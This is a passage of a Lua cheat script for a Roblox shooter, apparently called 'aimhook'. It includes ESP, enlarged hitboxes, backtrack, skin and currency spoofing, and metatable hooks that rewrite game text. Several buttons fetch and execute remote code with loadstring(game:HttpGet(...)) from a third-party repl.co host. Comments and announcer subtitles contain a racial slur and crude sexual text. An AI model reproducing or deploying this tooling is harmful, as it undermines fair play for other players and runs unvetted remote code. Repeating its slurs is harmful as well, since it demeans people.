    game.ReplicatedStorage["Viewmodels"]["v_The Darkheart"].Name = "v_Dagger"    
end)
k4Sec:AddButton("Let The Skies Fall", function(x)
    game.ReplicatedStorage["Viewmodels"]["v_Dagger"].Name = "fafwerwerewrw"
    game.ReplicatedStorage["Viewmodels"]["v_Night's Edge"].Name = "v_Dagger"
    
    for i,v in pairs(game.ReplicatedStorage["Viewmodels"]["v_Dagger"]:GetChildren()) do
        if v:IsA("Animation") then
            v:Destroy()
            for __, vls in pairs(_aimhookFolder:GetChildren()) do
                if vls:IsA("Animation") then
                    local __clone = vls:Clone()
                    __clone.Parent = game.ReplicatedStorage["Viewmodels"]["v_Dagger"]
                end
            end
        end
    end
    
    for i,v in pairs(game.ReplicatedStorage["Viewmodels"]["v_Dagger"]:GetChildren()) do
        if v.Name == "MeshPart" and v:FindFirstChild("Flame") then
            for nilPairs, val in pairs(v:GetChildren()) do
                if val:IsA("ParticleEmitter") then
                    val:Destroy()    
                end
            end
            
            v.Material = Enum.Material.Asphalt
            v.BrickColor = BrickColor.new("Really red")
            
            for __, vls in pairs(_aimhookFolder:GetChildren()) do
                if vls:IsA("ParticleEmitter") then
                    local __clone = vls:Clone()
                    __clone.Parent = v
                end
            end
        end
    end
    
    
    game:GetService("ReplicatedStorage").ItemData.Images.Melees.Dagger.Quality.Value = game:GetService("ReplicatedStorage").ItemData.Images.Melees["Night's Edge"].Quality.Value
    game:GetService("ReplicatedStorage").ItemData.Images.Melees.Dagger.Value = "http://www.roblox.com/asset/?id=160380852"
    game:GetService("ReplicatedStorage").KillIcons.Dagger.Value = "http://www.roblox.com/asset/?id=160380852"
    
    local Config =
{
    ProtectedName = "Let The Skies Fall", --What the protected name should be called. (Go to line 51)
    OtherPlayers = false, --If other players should also have protected names.
    OtherPlayersTemplate = "aimhook.xyz", --Template for other players protected name (ex: "NamedProtect" will turn into "NameProtect1" for first player and so on)
    RenameTextBoxes = true, --If TextBoxes should be renamed. (could cause issues with admin guis/etc)
    UseFilterPadding = false, --If filtePeach name should be the same size as a regular name.
    FilterPad = " ", --Character used to filter pad.
    UseMetatableHook = true, --Use metatable hook to increase chance of filtering. (is not supported on wrappers like bleu)
    UseAggressiveFiltering = true --Use aggressive property renaming filter. (renames a lot more but at the cost of lag)
}

local ProtectedNames = {}
local Counter = 1
if Config.OtherPlayers then
    for I, V in pairs(game.Players:GetPlayers()) do
        local Filter = Config.OtherPlayersTemplate .. tostring(Counter)
        if Config.UseFilterPadding then
            if string.len(Filter) > string.len(V.Name) then
                Filter = string.sub(Filter, 1, string.len(V.Name))
            elseif string.len(Filter) < string.len(V.Name) then
                local Add = string.len(V.Name) - string.len(Filter)
                for I=1,Add do
                    Filter = Filter .. Config.FilterPad
                end
            end
        end
        ProtectedNames[V.Name] = Filter
        Counter = Counter + 1
    end

    game.Players.PlayerAdded:connect(function(Player)
        local Filter = Config.OtherPlayersTemplate .. tostring(Counter)
        if Config.UseFilterPadding then
            if string.len(Filter) > string.len(V.Name) then
                Filter = string.sub(Filter, 1, string.len(V.Name))
            elseif string.len(Filter) < string.len(V.Name) then
                local Add = string.len(V.Name) - string.len(Filter)
                for I=1,Add do
                    Filter = Filter .. Config.FilterPad
                end
            end
        end
        ProtectedNames[Player.Name] = Filter
        Counter = Counter + 1
    end)
end

local LPName = "Dagger" -- hi, hi :D
local IsA = game.IsA

if Config.UseFilterPadding then
    if string.len(Config.ProtectedName) > string.len(LPName) then
        Config.ProtectedName = string.sub(Config.ProtectedName, 1, string.len(LPName))
    elseif string.len(Config.ProtectedName) < string.len(LPName) then
        local Add = string.len(LPName) - string.len(Config.ProtectedName)
        for I=1,Add do
            Config.ProtectedName = Config.ProtectedName .. Config.FilterPad
        end
    end
end

local function FilterString(S)
    local RS = S
    if Config.OtherPlayers then
        for I, V in pairs(ProtectedNames) do
            RS = string.gsub(RS, I, V)
        end
    end
    RS = string.gsub(RS, LPName, Config.ProtectedName)
    return RS
end

for I, V in pairs(game:GetDescendants()) do
    if Config.RenameTextBoxes then
        if IsA(V, "TextLabel") or IsA(V, "TextButton") or IsA(V, "TextBox") then
            V.Text = FilterString(V.Text)

            if Config.UseAggressiveFiltering then
                V:GetPropertyChangedSignal("Text"):connect(function()
                    V.Text = FilterString(V.Text)
                end)
            end
        end
    else
        if IsA(V, "TextLabel") or IsA(V, "TextButton") then
            V.Text = FilterString(V.Text)

            if Config.UseAggressiveFiltering then
                V:GetPropertyChangedSignal("Text"):connect(function()
                    V.Text = FilterString(V.Text)
                end)
            end
        end
    end
end

if Config.UseAggressiveFiltering then
    game.DescendantAdded:connect(function(V)
        if Config.RenameTextBoxes then
            if IsA(V, "TextLabel") or IsA(V, "TextButton") or IsA(V, "TextBox") then
                V:GetPropertyChangedSignal("Text"):connect(function()
                    V.Text = FilterString(V.Text)
                end)
            end
        else
            if IsA(V, "TextLabel") or IsA(V, "TextButton") then
                V:GetPropertyChangedSignal("Text"):connect(function()
                    V.Text = FilterString(V.Text)
                end)
            end
        end
    end)
end

if Config.UseMetatableHook then
    if not getrawmetatable then
        error("GetRawMetaTable not found")
    end

    local NewCC = function(F)
        if newcclosure then return newcclosure(F) end
        return F
    end

    local SetRO = function(MT, V)
        if setreadonly then return setreadonly(MT, V) end
        if not V and make_writeable then return make_writeable(MT) end
        if V and make_readonly then return make_readonly(MT) end
        error("No setreadonly found")
    end

    local MT = getrawmetatable(game)
    local OldNewIndex = MT.__newindex
    SetRO(MT, false)

    MT.__newindex = NewCC(function(T, K, V)
        if Config.RenameTextBoxes then
            if (IsA(T, "TextLabel") or IsA(T, "TextButton") or IsA(T, "TextBox")) and K == "Text" and type(V) == "string" then
                return OldNewIndex(T, K, FilterString(V))
            end
        else
            if (IsA(T, "TextLabel") or IsA(T, "TextButton")) and K == "Text" and type(V) == "string" then
                return OldNewIndex(T, K, FilterString(V))
            end
        end

        return OldNewIndex(T, K, V)
    end)

    SetRO(MT, true)
    end
    
end)

k4Sec:AddButton("Dagger To Dominus", function(yx)
    game.ReplicatedStorage.Viewmodels.v_Dagger.Handle.TextureID="rbxassetid://1484148974"
    game.ReplicatedStorage.Viewmodels.v_Dagger.Handle.MeshId="rbxassetid://1484148960"
    game.ReplicatedStorage.Viewmodels.v_Dagger.Handle.Size = Vector3.new(0.4, 2, 0.4);
    game.ReplicatedStorage.Viewmodels.v_Dagger.Handle.Rotation = Vector3.new(-90, 90, 0);
    
    
    if game.ReplicatedStorage.Viewmodels.v_Dagger:FindFirstChild("Part") then
        game.ReplicatedStorage.Viewmodels.v_Dagger.Part.Transparency = 1    
    end
    
    game:GetService("ReplicatedStorage").ItemData.Images.Melees.Dagger.Quality.Value = "Admin";
    game:GetService("ReplicatedStorage").ItemData.Images.Melees.Dagger.Value = "http://www.roblox.com/asset/?id=10720133728"
    game:GetService("ReplicatedStorage").KillIcons.Dagger.Value = "http://www.roblox.com/asset/?id=10720133728"
    
    local Config =
{
    ProtectedName = "Dominus Aureus", --What the protected name should be called. (Go to line 51)
    OtherPlayers = false, --If other players should also have protected names.
    OtherPlayersTemplate = "aimhook.xyz", --Template for other players protected name (ex: "NamedProtect" will turn into "NameProtect1" for first player and so on)
    RenameTextBoxes = true, --If TextBoxes should be renamed. (could cause issues with admin guis/etc)
    UseFilterPadding = false, --If filtePeach name should be the same size as a regular name.
    FilterPad = " ", --Character used to filter pad.
    UseMetatableHook = true, --Use metatable hook to increase chance of filtering. (is not supported on wrappers like bleu)
    UseAggressiveFiltering = true --Use aggressive property renaming filter. (renames a lot more but at the cost of lag)
}

local ProtectedNames = {}
local Counter = 1
if Config.OtherPlayers then
    for I, V in pairs(game.Players:GetPlayers()) do
        local Filter = Config.OtherPlayersTemplate .. tostring(Counter)
        if Config.UseFilterPadding then
            if string.len(Filter) > string.len(V.Name) then
                Filter = string.sub(Filter, 1, string.len(V.Name))
            elseif string.len(Filter) < string.len(V.Name) then
                local Add = string.len(V.Name) - string.len(Filter)
                for I=1,Add do
                    Filter = Filter .. Config.FilterPad
                end
            end
        end
        ProtectedNames[V.Name] = Filter
        Counter = Counter + 1
    end

    game.Players.PlayerAdded:connect(function(Player)
        local Filter = Config.OtherPlayersTemplate .. tostring(Counter)
        if Config.UseFilterPadding then
            if string.len(Filter) > string.len(V.Name) then
                Filter = string.sub(Filter, 1, string.len(V.Name))
            elseif string.len(Filter) < string.len(V.Name) then
                local Add = string.len(V.Name) - string.len(Filter)
                for I=1,Add do
                    Filter = Filter .. Config.FilterPad
                end
            end
        end
        ProtectedNames[Player.Name] = Filter
        Counter = Counter + 1
    end)
end

local LPName = "Dagger" -- hi, hi :D
local IsA = game.IsA

if Config.UseFilterPadding then
    if string.len(Config.ProtectedName) > string.len(LPName) then
        Config.ProtectedName = string.sub(Config.ProtectedName, 1, string.len(LPName))
    elseif string.len(Config.ProtectedName) < string.len(LPName) then
        local Add = string.len(LPName) - string.len(Config.ProtectedName)
        for I=1,Add do
            Config.ProtectedName = Config.ProtectedName .. Config.FilterPad
        end
    end
end

local function FilterString(S)
    local RS = S
    if Config.OtherPlayers then
        for I, V in pairs(ProtectedNames) do
            RS = string.gsub(RS, I, V)
        end
    end
    RS = string.gsub(RS, LPName, Config.ProtectedName)
    return RS
end

for I, V in pairs(game:GetDescendants()) do
    if Config.RenameTextBoxes then
        if IsA(V, "TextLabel") or IsA(V, "TextButton") or IsA(V, "TextBox") then
            V.Text = FilterString(V.Text)

            if Config.UseAggressiveFiltering then
                V:GetPropertyChangedSignal("Text"):connect(function()
                    V.Text = FilterString(V.Text)
                end)
            end
        end
    else
        if IsA(V, "TextLabel") or IsA(V, "TextButton") then
            V.Text = FilterString(V.Text)

            if Config.UseAggressiveFiltering then
                V:GetPropertyChangedSignal("Text"):connect(function()
                    V.Text = FilterString(V.Text)
                end)
            end
        end
    end
end

if Config.UseAggressiveFiltering then
    game.DescendantAdded:connect(function(V)
        if Config.RenameTextBoxes then
            if IsA(V, "TextLabel") or IsA(V, "TextButton") or IsA(V, "TextBox") then
                V:GetPropertyChangedSignal("Text"):connect(function()
                    V.Text = FilterString(V.Text)
                end)
            end
        else
            if IsA(V, "TextLabel") or IsA(V, "TextButton") then
                V:GetPropertyChangedSignal("Text"):connect(function()
                    V.Text = FilterString(V.Text)
                end)
            end
        end
    end)
end

if Config.UseMetatableHook then
    if not getrawmetatable then
        error("GetRawMetaTable not found")
    end

    local NewCC = function(F)
        if newcclosure then return newcclosure(F) end
        return F
    end

    local SetRO = function(MT, V)
        if setreadonly then return setreadonly(MT, V) end
        if not V and make_writeable then return make_writeable(MT) end
        if V and make_readonly then return make_readonly(MT) end
        error("No setreadonly found")
    end

    local MT = getrawmetatable(game)
    local OldNewIndex = MT.__newindex
    SetRO(MT, false)

    MT.__newindex = NewCC(function(T, K, V)
        if Config.RenameTextBoxes then
            if (IsA(T, "TextLabel") or IsA(T, "TextButton") or IsA(T, "TextBox")) and K == "Text" and type(V) == "string" then
                return OldNewIndex(T, K, FilterString(V))
            end
        else
            if (IsA(T, "TextLabel") or IsA(T, "TextButton")) and K == "Text" and type(V) == "string" then
                return OldNewIndex(T, K, FilterString(V))
            end
        end

        return OldNewIndex(T, K, V)
    end)

    SetRO(MT, true)
    end
end)





k2Sec:AddButton("Edit", function(xMen)
    local Config =
{
    ProtectedName = __protectName, --What the protected name should be called. (Go to line 51)
    OtherPlayers = false, --If other players should also have protected names.
    OtherPlayersTemplate = "aimhook.xyz", --Template for other players protected name (ex: "NamedProtect" will turn into "NameProtect1" for first player and so on)
    RenameTextBoxes = false, --If TextBoxes should be renamed. (could cause issues with admin guis/etc)
    UseFilterPadding = false, --If filtePeach name should be the same size as a regular name.
    FilterPad = " ", --Character used to filter pad.
    UseMetatableHook = true, --Use metatable hook to increase chance of filtering. (is not supported on wrappers like bleu)
    UseAggressiveFiltering = true --Use aggressive property renaming filter. (renames a lot more but at the cost of lag)
}

local ProtectedNames = {}
local Counter = 1
if Config.OtherPlayers then
    for I, V in pairs(game.Players:GetPlayers()) do
        local Filter = Config.OtherPlayersTemplate .. tostring(Counter)
        if Config.UseFilterPadding then
            if string.len(Filter) > string.len(V.Name) then
                Filter = string.sub(Filter, 1, string.len(V.Name))
            elseif string.len(Filter) < string.len(V.Name) then
                local Add = string.len(V.Name) - string.len(Filter)
                for I=1,Add do
                    Filter = Filter .. Config.FilterPad
                end
            end
        end
        ProtectedNames[V.Name] = Filter
        Counter = Counter + 1
    end

    game.Players.PlayerAdded:connect(function(Player)
        local Filter = Config.OtherPlayersTemplate .. tostring(Counter)
        if Config.UseFilterPadding then
            if string.len(Filter) > string.len(V.Name) then
                Filter = string.sub(Filter, 1, string.len(V.Name))
            elseif string.len(Filter) < string.len(V.Name) then
                local Add = string.len(V.Name) - string.len(Filter)
                for I=1,Add do
                    Filter = Filter .. Config.FilterPad
                end
            end
        end
        ProtectedNames[Player.Name] = Filter
        Counter = Counter + 1
    end)
end

local LPName = __gun -- hi, hi :D
local IsA = game.IsA

if Config.UseFilterPadding then
    if string.len(Config.ProtectedName) > string.len(LPName) then
        Config.ProtectedName = string.sub(Config.ProtectedName, 1, string.len(LPName))
    elseif string.len(Config.ProtectedName) < string.len(LPName) then
        local Add = string.len(LPName) - string.len(Config.ProtectedName)
        for I=1,Add do
            Config.ProtectedName = Config.ProtectedName .. Config.FilterPad
        end
    end
end

local function FilterString(S)
    local RS = S
    if Config.OtherPlayers then
        for I, V in pairs(ProtectedNames) do
            RS = string.gsub(RS, I, V)
        end
    end
    RS = string.gsub(RS, LPName, Config.ProtectedName)
    return RS
end

for I, V in pairs(game:GetDescendants()) do
    if Config.RenameTextBoxes then
        if IsA(V, "TextLabel") or IsA(V, "TextButton") or IsA(V, "TextBox") then
            V.Text = FilterString(V.Text)

            if Config.UseAggressiveFiltering then
                V:GetPropertyChangedSignal("Text"):connect(function()
                    V.Text = FilterString(V.Text)
                end)
            end
        end
    else
        if IsA(V, "TextLabel") or IsA(V, "TextButton") then
            V.Text = FilterString(V.Text)

            if Config.UseAggressiveFiltering then
                V:GetPropertyChangedSignal("Text"):connect(function()
                    V.Text = FilterString(V.Text)
                end)
            end
        end
    end
end

if Config.UseAggressiveFiltering then
    game.DescendantAdded:connect(function(V)
        if Config.RenameTextBoxes then
            if IsA(V, "TextLabel") or IsA(V, "TextButton") or IsA(V, "TextBox") then
                V:GetPropertyChangedSignal("Text"):connect(function()
                    V.Text = FilterString(V.Text)
                end)
            end
        else
            if IsA(V, "TextLabel") or IsA(V, "TextButton") then
                V:GetPropertyChangedSignal("Text"):connect(function()
                    V.Text = FilterString(V.Text)
                end)
            end
        end
    end)
end

if Config.UseMetatableHook then
    if not getrawmetatable then
        error("GetRawMetaTable not found")
    end

    local NewCC = function(F)
        if newcclosure then return newcclosure(F) end
        return F
    end

    local SetRO = function(MT, V)
        if setreadonly then return setreadonly(MT, V) end
        if not V and make_writeable then return make_writeable(MT) end
        if V and make_readonly then return make_readonly(MT) end
        error("No setreadonly found")
    end

    local MT = getrawmetatable(game)
    local OldNewIndex = MT.__newindex
    SetRO(MT, false)

    MT.__newindex = NewCC(function(T, K, V)
        if Config.RenameTextBoxes then
            if (IsA(T, "TextLabel") or IsA(T, "TextButton") or IsA(T, "TextBox")) and K == "Text" and type(V) == "string" then
                return OldNewIndex(T, K, FilterString(V))
            end
        else
            if (IsA(T, "TextLabel") or IsA(T, "TextButton")) and K == "Text" and type(V) == "string" then
                return OldNewIndex(T, K, FilterString(V))
            end
        end

        return OldNewIndex(T, K, V)
    end)

    SetRO(MT, true)
end
end)

bSec3:AddButton("Froggy's Apartment", function(x)
    game:GetService("TeleportService"):Teleport(5133094040, game.Players.LocalPlayer, {
        SuperSecretCode = "NotSoSuperSecretPoggyWoggy"
    });
end)

bSec3:AddButton("Stinky's Lair", function(x)
    game:GetService("TeleportService"):Teleport(4690140579, game.Players.LocalPlayer);
end)


bSec:AddTextbox("LocalSkinRewardReceive", "Enter Skin", function(State)
    configTable.Skin = State
end)

hSec:AddToggle("ESP", false, function(x)
    configTable.ESP = x
end)


hSec:AddToggle("Name ESP", false, function(x)
    configTable.NESP = x
end)
local nCol = hSec:AddToggle("Name Color", false, function(x)
end)
hSec:AddSlider("TextSize", 2, 9, 50, 1, function(State)
    configTable.NameESP.TextSize=State;
end)
hSec:AddDropdown("Font", {"JosefinSans", "Code", "GothamSemibold"}, "Code",false, function(x)
    configTable.NameESP.Font=x;
end)



nCol:AddColorpicker(Color3.fromRGB(255,0,255),function(x)
    configTable.NameESP.Color=x;    
end)

local sillyGoose69 = hSec:AddToggle("Watermark", false, function(x)
    watermark.Visible = x
end)
local sillyGoose = hSec:AddToggle("Fake Lag Chams", false, function(x)
    configTable.FakeLag = x
end)
sillyGoose:AddColorpicker(Color3.fromRGB(255,0,255), function(ztx)
   configTable.FL_COLOR=ztx
end)
hSec:AddTextbox("FakeLag Transparency", "0.5", function(State)
    if not tonumber(State) then return end
    configTable.FL_TRANSPARENCY = tonumber(State)
    print(State)
end)

hSec:AddTextbox("FakeLag Delay", "1", function(State)
    if not tonumber(State) then return end
    configTable.FL_TRANSPARENCY = tonumber(State)
    print(State)
end)

hSec:AddDropdown("Fake Lag Material", {"ForceField", "Neon", "SmoothPlastic", "Glass", "Ice"}, "ForceField",false, function(x)

end)

cSec:AddToggle("Extended Hitboxes", false, function(x)
    configTable.Hitboxes = x
end)
local newfunc = cSec:AddToggle("Backtrack", false, function(x)
    configTable.Backtrack=x;
end)
local newfunc54 = cSec:AddToggle("Hide Backtrack", false, function(x)
    configTable.Hideback=x;
end)
cSec:AddSlider("Backtrack Delay", 1, 900, 10000, 1, function(State)
    configTable.BacktrackDelay=State;
end)
newfunc:AddColorpicker(Color3.fromRGB(255,0,255),function(x)
    configTable.BacktrackColor=x;
end)

cSec:AddDropdown("HitBox Size", {"Legit", "Big", "Semi-Blatant", "Blatant","unmissable"}, "Legit",false, function(x)
    if x == "Legit" then
        getgenv().HeadSize=Vector3.new(5.5,5.7,5.9)
        getgenv().HumSize=Vector3.new(5,5,5)    

    end
    if x == "Big" then
        getgenv().HeadSize=Vector3.new(9.9,9.1,9.5)
        getgenv().HumSize=Vector3.new(9,9,9)    

    end
    
    if x == "Semi-Blatant" then
        getgenv().HeadSize=Vector3.new(13.9,13.9,13.9)
        getgenv().HumSize=Vector3.new(13,13,13)    

    end
    
    if x == "Blatant" then
        getgenv().HeadSize=Vector3.new(15,15,15)
        getgenv().HumSize=Vector3.new(14,14,14)    

    end
    
    if x == "unmissable" then
        getgenv().HeadSize=Vector3.new(65,65,65)
        getgenv().HumSize=Vector3.new(34,34,35)
    end
end)
cSec:AddDropdown("Backtrack Material", {"Neon", "ForceField", "Glass"}, "Neon",false, function(x)
    configTable.Backmat=x;
end)






hSec:AddToggle("Custom Sleeves", false, function(x)
    configTable.CS_SLEEVES = x    
end)

local colorPickerTh = hSec:AddToggle("Sleeves Color", false, function(x)
     
end)

colorPickerTh:AddColorpicker(Color3.fromRGB(255,255,255), function(ztx)
   __config.Color = ztx
end)

hSec:AddDropdown("Sleeve", {"galaxy", "arctic camo", "golden"}, "galaxy",false, function(dropdown)
    --configTable.LocalAimPart = dropdown
    if dropdown == "galaxy" then
        __config.Texture = "rbxassetid://11627980878"    
    end
    if dropdown == "arctic camo" then
        __config.Texture = "rbxassetid://6130174236"    
    end
    if dropdown == "golden" then
        __config.Texture = "rbxassetid://11628146767"    
    end
end)

hSec:AddButton("Get A Seizure", function(x)
    for i,v in pairs(game:GetDescendants()) do
        if v:IsA("ParticleEmitter") then
            v.Parent = game.Players.LocalPlayer.Character["Particle Area"]
        end
    end    
end)



bSec:AddButton("Delinquent With Drip", function(l)
    game.Players.LocalPlayer.Character.Shirt.ShirtTemplate = "http://www.roblox.com/asset/?id=6311929085"
    game.Players.LocalPlayer.Character.Pants.PantsTemplate = "http://www.roblox.com/asset/?id=6311929085"
     
     
    game.Players.LocalPlayer.Ragdoll.Shirt.ShirtTemplate = "http://www.roblox.com/asset/?id=6311929085"
    game.Players.LocalPlayer.Ragdoll.Pants.PantsTemplate = "http://www.roblox.com/asset/?id=6311929085"
    game.Players.LocalPlayer.Data.Skin.Value = "Segg with Drip"
    --game.Players.LocalPlayer.Character.Cap:Destroy()
 
end)

bSec:AddButton("Infinite Bucks", function(l)
    game:GetService("Players").LocalPlayer.PlayerGui.Menew.ShopButtons.Bucks.Bucks.Text = "      ∞"

end)

bSec:AddButton("ChrModels Bypass", function(x)
    for i = 0, 100 do 
        local Loader = require(game.ReplicatedStorage.Modules.AssetStreaming);
        local SkinTable = {}
        
        
        for _, Skin in pairs(game:GetService("ReplicatedStorage").ItemData.Images.Skins:GetChildren()) do
            table.insert(SkinTable, Skin.Name);
        end
        
        Loader.RequestAssets(SkinTable, "ChrModels")

    end
end)

bSec:AddButton("[FE] UnlockCratesExploit", function(l)
    for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Menew.Shop.Cases:GetChildren()) do
        if v:IsA("ImageButton") or v:IsA("ImageLabel") then
            v.Visible = true    
        end
    end
end)

bSec:AddButton("Unlock All Skins", function(h)
    -- DONT GET SNEAKY XONAE NIGGA
    loadstring(game:HttpGet("https://gangofgang.gog-best.repl.co/aimhook/script_assets/unlock-all.lua"))()    
end)

bSec:AddButton("P&O Team [Buggy]", function(h)
    -- DONT GET SNEAKY XONAE NIGGA
    loadstring(game:HttpGet("https://gangofgang.gog-best.repl.co/aimhook/script_assets/teams.lua"))()    
end)

bSec:AddButton("Level Inf", function(x)
    local __currentLevel = tostring(game:GetService("Players").LocalPlayer.CareerStatsCache.Level)
    
    task.spawn(function() while task.wait(1) do game:GetService("Players").LocalPlayer.PlayerGui.Menew.Main.PlrName.Text = game.Players.LocalPlayer.Name .. " - " .. "Level: inf" end end)
    
end)

bSec:AddButton("Redeem All Codes", function(h)
    --local __codes = {'pog', 'bloxy','xonae', 'JOHN', 'POKE', 'CBROX', 'EPRIKA', 'FLAMINGO', 'Pet', 'ANNA', 'Bandites', 'F00LISH', 'E', 'Garcello', 'kitten'}
    
    game:GetService("ReplicatedStorage").Redeem:InvokeServer("POG")
    --game:GetService("ReplicatedStorage").Redeem:InvokeServer("BLOXY")
    game:GetService("ReplicatedStorage").Redeem:InvokeServer("xonae")
    game:GetService("ReplicatedStorage").Redeem:InvokeServer("JOHN")
    game:GetService("ReplicatedStorage").Redeem:InvokeServer("POKE")
    game:GetService("ReplicatedStorage").Redeem:InvokeServer("CBROX")
    game:GetService("ReplicatedStorage").Redeem:InvokeServer("EPRIKA")
    game:GetService("ReplicatedStorage").Redeem:InvokeServer("FLAMINGO")
    game:GetService("ReplicatedStorage").Redeem:InvokeServer("PET")
    game:GetService("ReplicatedStorage").Redeem:InvokeServer("ANNA")
    game:GetService("ReplicatedStorage").Redeem:InvokeServer("Bandites")
    game:GetService("ReplicatedStorage").Redeem:InvokeServer("F00LISH")
    game:GetService("ReplicatedStorage").Redeem:InvokeServer("E")
    game:GetService("ReplicatedStorage").Redeem:InvokeServer("GARCELLO")
    game:GetService("ReplicatedStorage").Redeem:InvokeServer("KITTEN")



    
    
end)

bSec:AddButton("Storm Announcer (Syn Only)", function(e)
    local __announcerFiles = {'deploy.mp3', 'headshot.mp3', 'Winn.mp3', 'backstab.mp3', 'knived.mp3'}
    
    for __files, FObject in pairs(__announcerFiles) do
        if isfile(FObject) then
            delfile(FObject);    
        end
    end
    
    
    writefile("deploy.mp3", game:HttpGet("https://raw.githubusercontent.com/Storm99999/vxpestorm/main/imp/Deploy.mp3?raw=true"))

    writefile("headshot.mp3", game:HttpGet("https://raw.githubusercontent.com/Storm99999/vxpestorm/main/imp/headshot.mp3?raw=true"))

    writefile("Winn.mp3", game:HttpGet("https://raw.githubusercontent.com/Storm99999/vxpestorm/main/imp/Winn.mp3?raw=true"))

    writefile("backstab.mp3", game:HttpGet("https://raw.githubusercontent.com/Storm99999/vxpestorm/main/imp/backstab.mp3?raw=true"))
    
    for _, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Announcer:GetChildren()) do
        v.Volume.Value = 1
        for i,_v in pairs(v.Deploy:GetChildren()) do
            _v.Value = getsynasset("deploy.mp3")
            _v.Sub.Value = "Ohh, I wanna have butt sex with you, Wait Woa-woa, This is the wrong platform, Sorry."
        end
        
        for i,_v in pairs(v.KnifeKill:GetChildren()) do
            _v.Value = getsynasset("headshot.mp3")
            _v.Sub.Value = "Headshot, Woohoo."

        end
        
        for i,_v in pairs(v.Demoted:GetChildren()) do
            _v.Value = getsynasset("backstab.mp3")
            _v.Sub.Value = "Nigga. How the fuck did you manage to die?"

        end
        
        for i,_v in pairs(v.Headshot:GetChildren()) do
            _v.Value = getsynasset("headshot.mp3")
            _v.Sub.Value = "Headshot, Woohoo."

        end
        
        for i,_v in pairs(v.Winner:GetChildren()) do
            _v.Value = getsynasset("Winn.mp3")
            _v.Sub.Value = "Hacker, Hacker, Hacker! I'm telling you, it's a hacker!"

        end
    end
    
    
end)

bSec:AddButton("Add LocalSkin", function(l)
    for i = 1, 1 do
    table.insert(getupvalues(getsenv(game.Players.LocalPlayer.PlayerGui.Menew.LocalScript).ViewItems)[3].Skins,configTable.Skin)
end




function AddSkinDataForMissingSkins()
	for i, v in pairs(game:GetService("ReplicatedStorage").StreamedAssets.ChrModels:GetChildren()) do
		local Data = game:GetService("ReplicatedStorage").ItemData.Images.Skins:FindFirstChild(v.Name);
		if not Data then
			local Skin = Instance.new("StringValue");
			Skin.Name = v.Name;
			Skin.Value = "rbxassetid://0";
			Skin.Parent = game:GetService("ReplicatedStorage").ItemData.Images.Skins;
			
			local Quality = Instance.new("StringValue");
			Quality.Name = "Quality";
			Quality.Value = "Admin";
			Quality.Parent = Skin;
		end
	end
end

AddSkinDataForMissingSkins();

function ApplyUnusual(player, unusual)
    if player and player.Character and player.Character:FindFirstChild("Head") and unusual then
        if player.Character.Head:FindFirstChild("Unusual") then
            player.Character.Head.Unusual:Destroy();
        end
        if player.Character:FindFirstChild("UnusualAnimation") then
            player.Character.UnusualAnimation:Destroy();
        end
        if game.ReplicatedStorage.Unusual:FindFirstChild(unusual) then
            local v76 = game.ReplicatedStorage.Unusual[unusual];
            if v76:FindFirstChild("Orbit") then
                if v76.Orbit.Value then
                    local v77 = v76:Clone();
                    v77.UnusualAnimation.Part0 = player.Character.Head;
                    v77.UnusualAnimation.Part1 = v77;
                    v77.Name = "UnusualAnimation";
                    v77.Parent = player.Character;
                    player.Character.Humanoid:LoadAnimation(v77.Anim):Play();
                else
                    local v78 = {};
                    local v79 = v76.Attachment:Clone();
                    v79.Name = "Unusual";
                    v79.Parent = player.Character.Head;
                    local v80, v81, v82 = pairs(v76:GetChildren());
                    while true do
                        local v83, v84 = v80(v81, v82);
                        if v83 then

                        else
                            break;
                        end;
                        v82 = v83;
                        if v84.Name ~= "Attachment" then
                            local v85 = v84:Clone();
                            v85.Parent = player.Character.Head;
                            table.insert(v78, v85);
                        end;						
                    end;
                    if player.Character.Head:FindFirstChild("b1") then
                        local v86, v87, v88 = pairs(v79:GetChildren());
                        while true do
                            local v89, v90 = v86(v87, v88);
                            if v89 then

                            else
                                break;
                            end;
                            v88 = v89;
                            if v90:IsA("Beam") then
                                if v90.Name == "BeamA" then
                                    v90.Attachment0 = player.Character.Head.a1;
                                    v90.Attachment1 = player.Character.Head.a2;
                                elseif v90.Name == "BeamC" then
                                    v90.Attachment0 = player.Character.Head.c1;
                                    v90.Attachment1 = player.Character.Head.c2;
                                else
                                    v90.Attachment0 = player.Character.Head.b1;
                                    v90.Attachment1 = player.Character.Head.b2;
                                end;
                            end;							
                        end;
                    end;
                    v79.AncestryChanged:connect(function(p15)
                        if not p15 then
                            local v91, v92, v93 = pairs(v78);
                            while true do
                                local v94, v95 = v91(v92, v93);
                                if v94 then

                                else
                                    break;
                                end;
                                v93 = v94;
                                v95:Destroy();								
                            end;
                        end;
                    end);
                end;
            else
                v78 = {};
                v79 = v76.Attachment:Clone();
                v79.Name = "Unusual";
                v79.Parent = player.Character.Head;
                v80, v81, v82 = pairs(v76:GetChildren());
                while true do
                    v83, v84 = v80(v81, v82);
                    if v83 then

                    else
                        break;
                    end;
                    v82 = v83;
                    if v84.Name ~= "Attachment" then
                        v85 = v84:Clone();
                        v85.Parent = player.Character.Head;
                        table.insert(v78, v85);
                    end;					
                end;
                if player.Character.Head:FindFirstChild("b1") then
                    v86, v87, v88 = pairs(v79:GetChildren());
                    while true do
                        v89, v90 = v86(v87, v88);
                        if v89 then

                        else
                            break;
                        end;
                        v88 = v89;
                        if v90:IsA("Beam") then
                            if v90.Name == "BeamA" then
                                v90.Attachment0 = player.Character.Head.a1;
                                v90.Attachment1 = player.Character.Head.a2;
                            elseif v90.Name == "BeamC" then
                                v90.Attachment0 = player.Character.Head.c1;
                                v90.Attachment1 = player.Character.Head.c2;
                            else
                                v90.Attachment0 = player.Character.Head.b1;
                                v90.Attachment1 = player.Character.Head.b2;
                            end;
                        end;						
                    end;
                end;
                v79.AncestryChanged:connect(function(p15)
                    if not p15 then
                        v91, v92, v93 = pairs(v78);
                        while true do
                            v94, v95 = v91(v92, v93);
                            if v94 then

                            else
                                break;
                            end;
                            v93 = v94;
                            v95:Destroy();							
                        end;
                    end;
                end);
            end;
        end;
    end;
end

function convert_rgb_to_vertex(c3)
    return Vector3.new(c3.R, c3.G, c3.B)
end

function GetColor()
    if game:GetService("Players").LocalPlayer.Neutral then
        return game:GetService("Players").LocalPlayer.DesignColor.Value;
    end
    return game:GetService("Players").LocalPlayer.TeamColor;
end



function weldAccessory(accessory, character)
	local newAccessory = accessory:Clone();
	newAccessory.Parent = character;
	if newAccessory:FindFirstChild("Handle") then
		local handle = newAccessory.Handle;
